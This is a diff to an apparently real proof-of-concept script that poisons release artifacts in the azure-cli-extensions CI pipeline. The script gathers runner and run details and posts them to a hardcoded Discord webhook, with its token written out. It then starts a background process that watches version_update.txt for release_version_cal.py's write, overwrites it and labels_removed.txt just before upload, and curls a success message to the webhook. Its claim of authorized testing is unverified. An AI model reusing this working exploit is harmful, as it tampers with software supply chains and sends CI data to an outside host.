@@ -18,19 +18,16 @@ poc_data = {
     "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
 }
 
-# Webhook callback
 webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"
 
 message = json.dumps({
     "content": (
-        "**PoC: artifact poisoning attempt - azure-cli-extensions**\n"
+        "**PoC: artifact poisoning v3 - azure-cli-extensions**\n"
         "```\n"
-        f"Repo: {poc_data['github_repository']}\n"
         f"Run ID: {poc_data['github_run_id']}\n"
-        f"Event: {poc_data['github_event_name']}\n"
         f"Time: {poc_data['timestamp']}\n"
         "```\n"
-        "Background overwrite process started."
+        "Watcher started — monitoring version_update.txt mtime."
     )
 })
 
@@ -43,21 +40,38 @@ try:
 except Exception:
     pass
 
-# Artifact poisoning via background process
-# release_version_cal.py overwrites our content, so we need to wait
-# for it to finish, then overwrite AFTER it but BEFORE artifact upload
+# Strategy: watch version_update.txt for modification by release_version_cal.py
+# Once the mtime changes (meaning the script wrote to it), immediately overwrite
 cal_result = os.path.join(os.getcwd(), "cal_result")
 run_id = poc_data["github_run_id"]
 ts = poc_data["timestamp"]
 
-# Launch a background process that waits 30 seconds then overwrites
-# the artifact files right before upload
 overwrite_script = f"""
-import time, os
-time.sleep(30)
+import time, os, subprocess
+
 cal = "{cal_result}"
+vfile = os.path.join(cal, "version_update.txt")
+lfile = os.path.join(cal, "labels_removed.txt")
+webhook = "{webhook_url}"
+
+# Get initial mtime of the file
+initial_mtime = 0
+if os.path.exists(vfile):
+    initial_mtime = os.path.getmtime(vfile)
+
+# Poll until release_version_cal.py modifies the file (up to 90 seconds)
+for i in range(900):
+    time.sleep(0.1)
+    if os.path.exists(vfile):
+        current_mtime = os.path.getmtime(vfile)
+        if current_mtime > initial_mtime:
+            # File was modified by release_version_cal.py — overwrite NOW
+            time.sleep(0.2)  # tiny grace period
+            break
+
+# Overwrite with our content
 if os.path.isdir(cal):
-    with open(os.path.join(cal, "version_update.txt"), "w") as f:
+    with open(vfile, "w") as f:
         f.write(
             "## Responsible Disclosure Notice\\n\\n"
             "This automated comment was generated as part of an authorized security "
@@ -73,8 +87,14 @@ if os.path.isdir(cal):
             "unauthorized modifications were made.\\n\\n"
             "*Researcher: Bodlux | Run ID: {run_id} | Timestamp: {ts}*"
         )
-    with open(os.path.join(cal, "labels_removed.txt"), "w") as f:
+    with open(lfile, "w") as f:
         f.write("")
+
+    msg = '{{"content": "**Artifact overwrite SUCCESS** — version_update.txt replaced. Waiting for upload..."}}'
+    try:
+        subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", msg, webhook], timeout=5, capture_output=True)
+    except:
+        pass
 """
 
 subprocess.Popen(
